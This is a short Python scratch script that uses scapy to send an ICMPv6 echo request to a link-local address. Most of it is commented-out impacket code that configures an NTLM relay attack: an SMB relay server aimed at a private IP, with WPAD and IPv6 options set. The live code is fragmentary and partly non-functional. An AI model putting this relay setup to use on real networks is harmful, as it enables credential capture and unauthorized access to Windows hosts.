#!/usr/bin/env python3
from scapy.all import IPv6, ICMPv6EchoRequest, sendp, sr1,send
import ipaddress
import random

# from impacket.smbserver import SimpleSMBServer
# from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
# from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
# from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
# from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
# from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
#
# attacks = {"SMB": SMBAttack}
# clients = {"SMB": SMBRelayClient}
#
# target = TargetsProcessor(
#    singleTarget="192.168.253.138",
#    protocolClients=clients,
# )
# config = NTLMRelayxConfig()
#
# config.setMode("RELAY")
# config.target = target
# config.setAttacks(attacks)
# config.setProtocolClients(clients)
# config.setSMB2Support(True)
# config.setIPv6(True)
# config.setWpadOptions('192.168.243.135', 1)
# config.setInterfaceIp("192.168.253.135")
#
# server = SMBRelayServer(config)
# server.daemon = True
# server.start()
# server.join()
# server = SimpleSMBServer("192.168.253.135", 445)
# server.setSMBChallenge("")
# server.start()
# fe80::11cd:3852:b2df:f387
# iron fe80::ad5d:a0a0:f1d:bb1d
# response = sr1(
#    IPv6(dst="fe80::11cd:3852:b2df:f387") / ICMPv6EchoRequest(),
#    timeout=2,
#    verbose=False,
# )
# response.show()
def random_ipv6_addr(network):
    """
    Generate a random IPv6 address in the given network
    Example: random_ipv6_addr("fd66:6cbb:8c10::/48")
    Returns an IPv6Address object.
    """
    net = ipaddress.IPv6Network(network)
    # Which of the network.num_addresses we want to select?
    addr_no = random.randint(0, net.num_addresses)
    # Create the random address by converting to a 128-bit integer, adding addr_no and converting back
    network_int = int.from_bytes(net.network_address.packed, byteorder="big")
    addr_int = network_int + addr_no
    addr = ipaddress.IPv6Address(addr_int.to_bytes(16, byteorder="big"))
    return str(addr)



new_ipv6 = random_ipv6_addr("fe80::/64")
reply = send(
    IPv6(dst="fe80::ad5d:a0a0:f1d:bb1d") / ICMPv6EchoRequest(),
    verbose=False,
)
print(reply)
